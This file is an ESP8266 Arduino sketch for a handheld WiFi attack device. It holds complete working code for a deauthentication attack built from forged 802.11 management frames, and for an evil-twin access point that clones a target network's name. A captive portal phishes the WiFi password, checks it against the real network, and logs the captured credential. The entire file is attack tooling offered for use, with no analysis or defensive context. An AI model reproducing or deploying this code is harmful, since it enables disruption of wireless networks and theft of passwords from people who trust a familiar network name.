#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// Library tambahan untuk OLED
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// Deklarasi Variabel Global (DIPERBAIKI AGAR TIDAK ERROR)
unsigned long now = 0;
unsigned long deauth_now = 0;
bool led_state = false;

// Konfigurasi OLED 0.66 64x48
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define OLED_RESET    -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define LED_PIN 2

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

// --- FUNGSI SISTEM ---
void savePassword(String data) {
  File f = LittleFS.open("/pass.txt", "a");
  if (f) { f.println(data); f.close(); }
}

String readPasswords() {
  if (!LittleFS.exists("/pass.txt")) return "Belum ada log.";
  File f = LittleFS.open("/pass.txt", "r");
  String content = "";
  while (f.available()) { content += f.readStringUntil('\n') + "<br>"; }
  f.close();
  return content;
}

void updateOLED(String status) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.setCursor(0, 18);
  display.println(status);
  if(_selectedNetwork.ssid != "") {
    display.setCursor(0, 38);
    display.print("T:"); 
    display.println(_selectedNetwork.ssid.substring(0,8));
  }
  display.display();
}

void ledStrobo() {
  for(int i=0; i<30; i++) {
    digitalWrite(LED_PIN, LOW); delay(30);
    digitalWrite(LED_PIN, HIGH); delay(30);
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      _networks[i].ch = WiFi.channel(i);
    }
  }
}

// --- HANDLER WEB ---
void handleResult() {
  int timeout = 0;
  while (WiFi.status() != WL_CONNECTED && timeout < 20) { delay(500); timeout++; }
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},2000);</script><body><h2 style='color:red;'>Pass Salah</h2></body></html>");
  } else {
    String logEntry = "SSID: " + _selectedNetwork.ssid + " | PASS: " + _tryPassword;
    savePassword(logEntry);
    _correct = logEntry;
    hotspot_active = false; deauthing_active = false;
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("GMpro", "Sangkur87");
    dnsServer.start(DNS_PORT, "*", apIP);
    updateOLED("PASS GOT!");
    ledStrobo();
    webServer.send(200, "text/html", "<html><body><h2>Success</h2></body></html>");
  }
}

void handleIndex() {
  if (webServer.hasArg("clear")) { LittleFS.remove("/pass.txt"); _correct = ""; }
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _selectedNetwork = _networks[i];
    }
  }
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") { deauthing_active = true; updateOLED("DEAUTH ON"); }
    else { deauthing_active = false; updateOLED("DEAUTH OFF"); }
  }
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true; dnsServer.stop(); WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
      updateOLED("EVIL ON");
    } else {
      hotspot_active = false; dnsServer.stop(); WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("GMpro", "Sangkur87");
      dnsServer.start(DNS_PORT, "*", apIP);
      updateOLED("EVIL OFF");
    }
    return;
  }

  if (!hotspot_active) {
    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;} .btn{padding:10px;margin:5px;background:#444;color:#fff;border:none;border-radius:5px;} .sel{background:#2e7d32;}</style></head><body><h1>GMpro87</h1><div style='margin-bottom:20px;'>";
    html += "<form action='/' method='post'><button class='btn' name='deauth' value='" + String(deauthing_active?"stop":"start") + "'>" + String(deauthing_active?"Stop Deauth":"Start Deauth") + "</button>";
    html += "<button class='btn' name='hotspot' value='" + String(hotspot_active?"stop":"start") + "'>Start EvilTwin</button>";
    html += "<button class='btn' name='clear' value='1' style='background:#800;'>Clear</button></form></div><table>";
    for(int i=0; i<16; i++) {
      if(_networks[i].ssid == "") break;
      String bssid = bytesToStr(_networks[i].bssid, 6);
      html += "<tr><td>"+_networks[i].ssid+"</td><td><form method='post' action='/?ap="+bssid+"'><button class='btn "+(bytesToStr(_selectedNetwork.bssid,6)==bssid?"sel":"")+"'>Select</button></form></td></tr>";
    }
    html += "</table><div style='margin-top:20px;color:#0f0;'>"+readPasswords()+"</div></body></html>";
    webServer.send(200, "text/html", html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      handleResult();
    } else {
      String p = "<html><body style='text-align:center;font-family:sans-serif;'><h2>Authentication Required</h2><form action='/'><input type='password' name='password' placeholder='WiFi Password' minlength='8' required><br><br><input type='submit' value='Connect'></form></body></html>";
      webServer.send(200, "text/html", p);
    }
  }
}

// --- SETUP & LOOP ---
void setup() {
  LittleFS.begin();
  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH);
  Wire.begin(4, 5);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  updateOLED("Ready");
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "Sangkur87");
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/CurrentTarget", []() { webServer.send(200, "text/plain", _selectedNetwork.ssid); });
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active && (millis() - deauth_now >= 1000)) {
    led_state = !led_state; digitalWrite(LED_PIN, led_state);
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t dp[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x01,0x00};
    memcpy(&dp[10], _selectedNetwork.bssid, 6); memcpy(&dp[16], _selectedNetwork.bssid, 6);
    wifi_send_pkt_freedom(dp, 25, 0); dp[0] = 0xA0; wifi_send_pkt_freedom(dp, 25, 0);
    deauth_now = millis();
  }
  if (hotspot_active && !deauthing_active) digitalWrite(LED_PIN, LOW);
  else if (!hotspot_active && !deauthing_active) digitalWrite(LED_PIN, HIGH);
  if (millis() - now >= 15000 && !hotspot_active && !deauthing_active) { performScan(); now = millis(); }
}
